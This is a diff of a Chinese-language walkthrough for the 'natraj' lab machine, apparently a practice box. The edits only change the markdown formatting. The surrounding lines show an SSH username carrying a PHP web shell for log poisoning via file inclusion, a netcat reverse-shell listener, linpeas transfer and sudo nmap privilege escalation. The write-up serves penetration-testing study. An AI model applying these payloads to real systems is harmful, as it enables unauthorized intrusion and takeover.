@@ -163,13 +163,14 @@ file                    [Status: 200, Size: 1398, Words: 9, Lines: 28, Duration:
 ![IMG](../FILES/natraj/img-20220721124057.png)
 ![IMG](../FILES/natraj/img-20220721123732.png)
 查看默认日志目录下的auth.log, 发现记录了访问日志
+<br>
 ![IMG](../FILES/natraj/img-20220721124220.png)
->尝试ssh登录, 无所谓用户名, 不知道用户名和密码
+<br>尝试ssh登录, 无所谓用户名, 不知道用户名和密码
 ![IMG](../FILES/natraj/img-20220721133722.png)
->可以发现用户名在此显示
+<br>可以发现用户名在此显示
 
 #### 利用LFI和local日志获取反弹shell
->使用php内的system函数把get请求换成cmd
+<br>使用php内的system函数把get请求换成cmd
 ```
 └─$ ssh '<?php system($_GET['cmd']); ?>'@192.168.146.69                                                                                                 1 ⨯
 The authenticity of host '192.168.146.69 (192.168.146.69)' can't be established.
@@ -207,8 +208,8 @@ Connection: close
 
 ![IMG](../FILES/natraj/img-20220721133323.png)
 
-### 提权
-> 本地使用python运行http服务, 从远程拷贝linpeas
+## 提权
+<br>本地使用python运行http服务, 从远程拷贝linpeas
 ```
 $ /usr/bin/script -qc /bin/bash /dev/null
 www-data@ubuntu:/tmp$ ls
@@ -354,9 +355,9 @@ cp apache2.conf /etc/apache2/apache2.conf
 www-data@ubuntu:/tmp$ 
 
 ```
->然后....重启服务器
-重新反弹shell
-获得新用户的权限
+<br>然后....重启服务器
+<br>重新反弹shell
+<br>获得新用户的权限
 ```
 ┌──(aacai㉿kali)-[~/Desktop/gooann/natraj-192.168.146.69]
 └─$ nc -nvlp 4444
@@ -373,8 +374,8 @@ User mahakal may run the following commands on ubuntu:
     (root) NOPASSWD: /usr/bin/nmap
 $ 
 ```
->这个用户可以在使用nmap的时候可以直接使用sudo
-编写一个nse文件, 然后执行/bin/bash
+<br>这个用户可以在使用nmap的时候可以直接使用sudo
+<br>编写一个nse文件, 然后执行/bin/bash
 ```
 $ /usr/bin/script -qc /bin/bash /dev/null
 mahakal@ubuntu:/tmp$ ls
